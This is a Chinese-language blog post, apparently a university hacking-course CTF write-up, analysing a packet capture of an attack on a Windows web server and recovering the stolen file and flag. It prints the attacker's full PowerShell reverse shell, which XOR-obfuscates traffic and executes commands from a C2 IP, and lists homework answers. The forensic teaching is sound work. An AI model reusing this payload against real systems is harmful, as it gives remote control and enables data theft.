@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.2">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-tail.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-tail.png">
+  <link rel="mask-icon" href="/images/tail.svg" color="#222">
+  <meta name="google-site-verification" content="5POakq1iR3soBgSPJX__DRW6QXkfxgZV9yNcnWQ95j0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.eevee.tw","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":260,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Description我架的破爛網站似乎被攻擊啦~!? 你能幫我從封包檔裡分析出駭客C2的IP、操作的指令、搜集到的資訊與被偷走的檔案內容(含 flag)嗎? 求求你了大大! QAQ ~ &lt;(_ _)&gt;  Hint: powershell, reverse shell, symmetric encryption  Auther: stavhaygn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSYSU 駭客攻防 hw_0x01 Writeup">
+<meta property="og:url" content="blog.eevee.tw/2020/201104-htcf-hw1-writeup/index.html">
+<meta property="og:site_name" content="yctseng&#39;s Blog">
+<meta property="og:description" content="Description我架的破爛網站似乎被攻擊啦~!? 你能幫我從封包檔裡分析出駭客C2的IP、操作的指令、搜集到的資訊與被偷走的檔案內容(含 flag)嗎? 求求你了大大! QAQ ~ &lt;(_ _)&gt;  Hint: powershell, reverse shell, symmetric encryption  Auther: stavhaygn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-vXvmSv2/0/8a17940e/X2/i-vXvmSv2-X2.png">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-Lzkmd8K/0/ce9c5e08/X2/i-Lzkmd8K-X2.png">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-LVfRzPx/0/848e5220/X2/i-LVfRzPx-X2.png">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-7Dfsbpx/0/62f1e281/X2/i-7Dfsbpx-X2.png">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-bgRm7Rm/0/cb9580ae/X2/i-bgRm7Rm-X2.png">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-hzBDZk3/0/32712749/X3/i-hzBDZk3-X3.png">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-4zzCJsC/0/265a79e8/X2/i-4zzCJsC-X2.png">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-sQ8kP2n/0/e1b58d09/XL/i-sQ8kP2n-XL.png">
+<meta property="article:published_time" content="2020-11-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-11-03T07:06:31.564Z">
+<meta property="article:author" content="yctseng">
+<meta property="article:tag" content="HTCF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://photos.smugmug.com/photos/i-vXvmSv2/0/8a17940e/X2/i-vXvmSv2-X2.png">
+
+<link rel="canonical" href="blog.eevee.tw/2020/201104-htcf-hw1-writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>NSYSU 駭客攻防 hw_0x01 Writeup | yctseng's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-137531005-1"></script>
+    <script data-pjax>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-137531005-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">yctseng's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">課金一瞬、嫁一生 <span style="font-size:1em;color:yellow;"><i class="fas fa-comment-dollar" ></i></span></p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">8</span></a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">32</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">31</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="blog.eevee.tw/2020/201104-htcf-hw1-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/yctseng.png">
+      <meta itemprop="name" content="yctseng">
+      <meta itemprop="description" content="競程廢物、資安菜鳥 >_<">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yctseng's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NSYSU 駭客攻防 hw_0x01 Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-11-03 2020-11-03T00:00:00+08:00" itemprop="dateCreated datePublished" datetime="2020-11-03T00:00:00+08:00">2020-11-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>5.4k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>我架的破爛網站似乎被攻擊啦~!? 你能幫我從封包檔裡分析出駭客C2的IP、操作的指令、搜集到的資訊與被偷走的檔案內容(含 flag)嗎?</p>
+<p>求求你了大大! QAQ ~ &lt;(_ _)&gt;</p>
+<blockquote>
+<p>Hint: powershell, reverse shell, symmetric encryption</p>
+</blockquote>
+<p>Auther: <strong>stavhaygn</strong></p>
+<a id="more"></a>
+
+<p>Writeups 搬自 <a target="_blank" rel="noopener" href="https://github.com/MacacaHub/CTF-writeups/tree/master/HTCF%20CTF/reverse_shell">MacacaHub HTCF reverse_shell</a></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>題目給定一封包檔 <code>.pcap</code> 進行分析，在封包數量不多的前提可以用 <code>Follow &gt; TCP stream</code> 把零碎的封包片段組起來方便查看，可以發現全部 14 筆 TCP stream 大部分都算是可讀資訊，但經過一段 PowerShell script 後，有一整段的封包完全不可讀（如圖）。</p>
+<p><img src="https://photos.smugmug.com/photos/i-vXvmSv2/0/8a17940e/X2/i-vXvmSv2-X2.png" alt="wireshark-powershell_script"><br><img src="https://photos.smugmug.com/photos/i-Lzkmd8K/0/ce9c5e08/X2/i-Lzkmd8K-X2.png" alt="wireshark-encrypt_text"></p>
+<p>從 PowerShell 不難看出有經過 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Base64">Base64</a> 混淆（注意最後的<code>%3D</code>其實就是 URL encode 的<code>=</code>），這題上線的前兩天恰好是中山資安社 講師<a target="_blank" rel="noopener" href="https://stillu.cc/">Still</a> 講過的 PowerShell 奇淫巧技，把 Base64 解開來後就跟社課一樣可以逐步分析。</p>
+<p><img src="https://photos.smugmug.com/photos/i-LVfRzPx/0/848e5220/X2/i-LVfRzPx-X2.png" alt="command_line-base64_decode"></p>
+<blockquote>
+<ol>
+<li>建議可以用 VSCode 的 highlight 會好看很多 0w0</li>
+<li>script 是以 <code>;</code> 作為語義上的結尾，所以可直接取代成換行<code>\n</code> (但要注意迴圈內的分號還是需要存在ㄉ)</li>
+<li>加密key <code>$xor_passwd</code> 中間那個是 “0” 不是 “O” … 如果寫錯會還原不完整xD</li>
+</ol>
+</blockquote>
+<figure class="highlight powershell"><figcaption><span>paylaod.ps1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-Xor</span></span> &#123;</span><br><span class="line">    <span class="variable">$xor_passwd</span> = <span class="string">&quot;x0R_&quot;</span></span><br><span class="line">    <span class="variable">$padding_xor_passwd</span> = (<span class="variable">$xor_passwd</span> * [<span class="built_in">int</span>](<span class="variable">$args</span>[<span class="number">0</span>].Length / <span class="variable">$xor_passwd</span>.Length)) + <span class="variable">$xor_passwd</span>.Substring(<span class="number">0</span>, <span class="variable">$args</span>[<span class="number">0</span>].Length % <span class="variable">$xor_passwd</span>.Length)</span><br><span class="line">    <span class="variable">$args</span>[<span class="number">0</span>] = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$args</span>[<span class="number">0</span>])</span><br><span class="line">    <span class="variable">$args</span>[<span class="number">0</span>] = <span class="variable">$</span>(</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$args</span>[<span class="number">0</span>].Length; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$args</span>[<span class="number">0</span>][<span class="variable">$i</span>] <span class="operator">-bxor</span> <span class="variable">$padding_xor_passwd</span>[<span class="variable">$i</span>]</span><br><span class="line">        &#125;)</span><br><span class="line">    [<span class="type">System.Text.Encoding</span>]::UTF8.GetString(<span class="variable">$args</span>[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;45.79.159.73&quot;</span>, <span class="number">39637</span>)</span><br><span class="line"><span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream()</span><br><span class="line">[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$command</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>)</span><br><span class="line">    <span class="variable">$command</span> = <span class="built_in">Get-Xor</span> <span class="variable">$command</span></span><br><span class="line">    <span class="variable">$response</span> = (<span class="built_in">iex</span> <span class="variable">$command</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> )</span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$response</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span></span><br><span class="line">    <span class="variable">$response</span> = <span class="built_in">GET-Xor</span> <span class="variable">$response</span></span><br><span class="line">    <span class="variable">$response</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$response</span>)</span><br><span class="line">    <span class="variable">$stream</span>.Write(<span class="variable">$response</span>,<span class="number">0</span>,<span class="variable">$response</span>.Length)</span><br><span class="line">    <span class="variable">$stream</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>
+
+<p>應該有不少人是拿到 PowerShell script 就直接拿去 Run，提醒一下在野生環境千萬不要這麼做，因為那等於是你幫駭客執行惡意程式 XDDD （助教非常扼腕應該要把 C&amp;C Server 開著等同學連進來後再幫對方彈個小算盤www）</p>
+<p>關於上面這段 code ，總共可以分成兩個部分：</p>
+<ol>
+<li><p>單獨來看 Get-Xor function 其實就是拿 input 和 xor_passwd 做 XOR 運算，其中 xor_password 長度不足的部分就重複 padding，必要時可以開 PowerShell 測試。<br>要注意的是算出來的字串不一定都是可視字元（也不要直接把 wireshark 的 ASCII 字串手動複製==）。</p>
+</li>
+<li><p>從 line 13 開始是 C&amp;C Server 連線建立，在送出指令和接收資訊的時候分別做 Get-Xor 混淆，這也是為何 wireshark 有一整段都看不懂的原因。這段 script 其中 <code>iex</code> (<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7">Invoke-Expression</a>) 就是執行的部分，有點像 Python <code>eval</code> 這類的容易被駭客濫用的危險功能。</p>
+</li>
+</ol>
+<p>知道混淆方式，那就有辦法還原啦！<br>不知道各位是如何把密文 dump 出來，我個人是直接用 Python 把指定封包條件下的字串拿出來的同時順便解密~<br>這裡簡單帶一下 <a target="_blank" rel="noopener" href="https://scapy.readthedocs.io/en/latest/">scapy</a> 套件的使用方式。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Python3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkts = rdpcap(<span class="string">&#x27;./reverse_shell.pcap&#x27;</span>) <span class="comment"># read pcap file</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(pkts) <span class="comment"># check data tpye</span></span><br><span class="line">&lt;Class <span class="string">&#x27;scapy.plist.PacketList&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkts[<span class="number">0</span>].show() <span class="comment"># use show() or display() to see info in packet</span></span><br><span class="line"><span class="comment">###[ Ethernet ]###</span></span><br><span class="line">  dst       = ff:ff:ff:ff:ff:ff</span><br><span class="line">  src       = <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">8</span>c:d3:ad</span><br><span class="line">  type      = IPv4</span><br><span class="line"><span class="comment">###[ IP ]###</span></span><br><span class="line">     version   = <span class="number">4</span></span><br><span class="line">     ihl       = <span class="number">5</span></span><br><span class="line">     tos       = <span class="number">0x0</span></span><br><span class="line">     len       = <span class="number">229</span></span><br><span class="line">     id        = <span class="number">29572</span></span><br><span class="line">     flags     =</span><br><span class="line">     frag      = <span class="number">0</span></span><br><span class="line">     ttl       = <span class="number">128</span></span><br><span class="line">     proto     = udp</span><br><span class="line">     chksum    = <span class="number">0xad76</span></span><br><span class="line">     src       = <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span></span><br><span class="line">     dst       = <span class="number">10.0</span><span class="number">.2</span><span class="number">.255</span></span><br><span class="line">     \options   \</span><br><span class="line"><span class="comment">###[ UDP ]###</span></span><br><span class="line">     sport     = netbios_dgm</span><br><span class="line">     dport     = netbios_dgm</span><br><span class="line">     len       = <span class="number">209</span></span><br><span class="line">     chksum    = <span class="number">0x19f0</span></span><br><span class="line">( etc. )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkts[<span class="number">0</span>][<span class="string">&#x27;IP&#x27;</span>].show() <span class="comment"># show spectify field info following</span></span><br><span class="line"><span class="comment">###[ IP ]###</span></span><br><span class="line">     version   = <span class="number">4</span></span><br><span class="line">     ihl       = <span class="number">5</span></span><br><span class="line">     tos       = <span class="number">0x0</span></span><br><span class="line">     len       = <span class="number">229</span></span><br><span class="line">     id        = <span class="number">29572</span></span><br><span class="line">     flags     =</span><br><span class="line">     frag      = <span class="number">0</span></span><br><span class="line">     ttl       = <span class="number">128</span></span><br><span class="line">     proto     = udp</span><br><span class="line">     chksum    = <span class="number">0xad76</span></span><br><span class="line">     src       = <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span></span><br><span class="line">     dst       = <span class="number">10.0</span><span class="number">.2</span><span class="number">.255</span></span><br><span class="line">     \options   \</span><br><span class="line"><span class="comment">###[ UDP ]###</span></span><br><span class="line">     sport     = netbios_dgm</span><br><span class="line">     dport     = netbios_dgm</span><br><span class="line">     len       = <span class="number">209</span></span><br><span class="line">     chksum    = <span class="number">0x19f0</span></span><br><span class="line">( etc. )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkts[<span class="number">0</span>][<span class="string">&#x27;IP&#x27;</span>].src <span class="comment"># show spectify field info </span></span><br><span class="line"><span class="string">&#x27;10.0.2.15&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>透過上述的用法就能拿來找指定 info ，以下 code 僅供參考。</p>
+<figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pkts = rdpcap(<span class="string">&#x27;reverse_shell.pcap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;out.raw&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> pkts:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;IP&#x27;</span> <span class="keyword">in</span> p <span class="keyword">and</span> ( p[<span class="string">&#x27;IP&#x27;</span>].src == <span class="string">&#x27;45.79.159.73&#x27;</span> <span class="keyword">or</span> p[<span class="string">&#x27;IP&#x27;</span>].dst == <span class="string">&#x27;45.79.159.73&#x27;</span> ):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Raw&#x27;</span> <span class="keyword">in</span> p <span class="keyword">and</span> ( p[<span class="string">&#x27;TCP&#x27;</span>].sport==<span class="number">39637</span> <span class="keyword">or</span> p[<span class="string">&#x27;TCP&#x27;</span>].dport==<span class="number">39637</span> ):</span><br><span class="line">                <span class="comment">#f.write(p[&#x27;Raw&#x27;].load)</span></span><br><span class="line">                raw = p[<span class="string">&#x27;Raw&#x27;</span>].load</span><br><span class="line">                xor_passwd = <span class="string">&quot;x0R_&quot;</span></span><br><span class="line">                res = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">for</span> idx, word <span class="keyword">in</span> enumerate(raw):</span><br><span class="line">                    res += chr(word ^ ord(xor_passwd[idx%<span class="number">4</span>]))</span><br><span class="line">                <span class="comment">#print(res, end=&quot;&quot;)</span></span><br><span class="line">                f.write(res)</span><br></pre></td></tr></table></figure>
+
+<p>在抓資料的過程順便解密+寫檔，順利的話結果會很<del>漂</del>亮~ <a target="_blank" rel="noopener" href="https://github.com/MacacaHub/CTF-writeups/blob/master/HTCF%20CTF/reverse_shell/result.out">MacacaHub-result.out</a><br>從結果來看可以發現駭客利用受害主機上傳了一份 <code>secret.docx</code> 到 C&amp;C Server，所以下一步我們要把檔案抓出來。</p>
+<p>檔案一樣是藏在題目給的封包檔中，我自己在這個環節卡很久，之後和其他朋友聊才發現大部分都是先把 word 檔 dump 出來XDDD<br>至於 dump 的方式很多種，但我的方式自認蠻哈扣的，如果有更好的方法歡迎找我交流QwQ</p>
+<p>簡單聊一下我當時卡住的點~<br>由於打 CTF 偶爾會遇到 MS word 題，因此我的觀念上其 binary 標頭和壓縮檔一樣都是 “PK”，也就是可以透過 <code>unzip</code> 指令把整個 word 拆成很多個 .xml 以及圖片檔案(如果內文有圖片的話)，因此我在整個 pcap檔 始終挖不到自己想像中的答案 … 。<br>直到我最後自己測試開了一份加密過的 word 才發現完全不是這麼一回事，實際上只要把藏在封包裡的 binary 處理一下就能拿到 word，具體操作如下。</p>
+<p><img src="https://photos.smugmug.com/photos/i-7Dfsbpx/0/62f1e281/X2/i-7Dfsbpx-X2.png" alt=" wireshark-word_packet"></p>
+<p>同樣用 <code>Follow &gt; TCP stream</code> 觀察，很容易找到這份看起來就是<strong>被</strong>處理過的資料，可以透過 <code>File &gt; Export Objects &gt; HTTP...</code> 把指定的封包 dump 出來。</p>
+<p><img src="https://photos.smugmug.com/photos/i-bgRm7Rm/0/cb9580ae/X2/i-bgRm7Rm-X2.png" alt=" wireshark-exports_object_http"> </p>
+<p>這部分可以從檔案類型 “multipart/form-data” 辨別，然後存成 secret.docx 。<br>再來你會發現… 雙擊點開檔案是爛掉ㄉ，這時就可以自己另外開一份加密過的 word，並把這兩份檔案用 十六進制編輯器 打開比較看看。</p>
+<p><img src="https://photos.smugmug.com/photos/i-hzBDZk3/0/32712749/X3/i-hzBDZk3-X3.png" alt=" MS_word-hex_compare"></p>
+<p>如圖，左半部是我自己產生的加密 .docx，右半部則是從封包 dump 出來的檔案，應該不難看出 secret.docx 的檔頭混了很多額外資訊，但透過比對把 0x<code>D0CF</code> 之前的 hex 拿掉就可以還原成正常的加密 .docx（至於檔尾只會讀到 <code>&lt;/encryption&gt;</code> 所以有沒有改動都不影響）。</p>
+<p>啊 .docx 密碼勒？？</p>
+<p>如果有成功把上一段XOR加密的封包還原，.docx 的密碼就藏在裡面自己找 嘻嘻&gt;_&lt;</p>
+<h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><ol>
+<li>受害主機的外部(實體) IP位址是?<blockquote>
+<p>140.117.169.233</p>
+</blockquote>
+</li>
+<li>駭客C2主機所使用的IP位址和port?<blockquote>
+<p>45.79.159.73:39637</p>
+</blockquote>
+</li>
+<li>C2主機是哪一家虛擬專屬主機(VPS)提供商所提供的? <blockquote>
+<p>Linode</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://photos.smugmug.com/photos/i-4zzCJsC/0/265a79e8/X2/i-4zzCJsC-X2.png" alt=" command_line-whois "></p>
+<ol start="4">
+<li>Reverse shell的TCP連線內容是用哪一種加密演算法加密? 加密金鑰是?<blockquote>
+<p>XOR cipher、x0R_</p>
+</blockquote>
+</li>
+<li>受害主機所在的AD域的域名?<blockquote>
+<p>macaca.lab</p>
+</blockquote>
+</li>
+<li>受害主機所在的AD域中的IP位址?<blockquote>
+<p>192.168.77.30</p>
+</blockquote>
+</li>
+<li>AD域中的DNS主機的名稱與IP位址?<blockquote>
+<p>dc.macaca.lab、192.168.77.10</p>
+</blockquote>
+</li>
+<li>網站產生漏洞原因是? <blockquote>
+<p>於網站中存在含有 RCE(Remote Code Execution) 漏洞，且針對輸入的參數並沒有進行格式檢查，導致駭客可以透過植入C&amp;C惡意程式洩漏資訊。</p>
+</blockquote>
+</li>
+<li>上傳洩漏資料的網站所用的port?<blockquote>
+<p>42794</p>
+</blockquote>
+</li>
+<li>flag是?<blockquote>
+<p>flag{p0w3rsh3ll_1s_funny}</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="Extra"><a href="#Extra" class="headerlink" title="Extra"></a>Extra</h2><blockquote>
+<p>請嘗試完整說明此次駭客從利用網站漏洞到資料外洩的攻擊事件流程</p>
+</blockquote>
+<p>推測原始網站的功能為 輸入IP回傳Ping IP的結果，但是由於網站後端並沒有針對輸入進行格式檢查，且存在 RCE 漏洞導致被駭客利用。</p>
+<p>駭客攻擊思路如下：<br><img src="https://photos.smugmug.com/photos/i-sQ8kP2n/0/e1b58d09/XL/i-sQ8kP2n-XL.png" alt=" "></p>
+<p>駭客先是使用 <code>dir</code> 指令成功讓網站執行並回傳資訊，確認 RCE 漏洞，再利用 PowerShell 不被 Windows 偵測的特性使用無檔案攻擊，將指令執行至 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Active_Directory">AD</a> 中的子網域主機。在指令方面，駭客主要建立 C&amp;C Server 連線，並且將輸入指令以及回傳資訊透過 Get-Xor function 進行混淆，用意是增加資安人員在鑑識分析上的困難度。</p>
+<p>駭客取得主機執行指令的使用者權限後進行搜集情資，包含查看當前使用者(whoami)、網卡資訊(ipconfig /all)、系統資訊(systeminfo)、列出arp紀錄(arp -a)，查看網域底下其他主機資訊(nslookup)，最後才開始針對目錄進行探索。</p>
+<p>駭客從原目錄 <code>C:\Users\web\xampp\htdocs</code> 逐步移動到 <code>C:\Users\web\Desktop\_</code> 發現 passwords.txt 拿到 ftp、docx、sso 三組密碼，同時也在<code>C:\Users\web\Downloads</code> 底下找到 secret.docx，最後透過 PowerShell 指令將該檔案上傳至 C&amp;C Server。</p>
+
+    </div>
+
+    
+    
+    <div>
+    
+        <div style="width: 168px; margin: auto"><img src="/imges/end.png"></div>
+    
+</div>
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
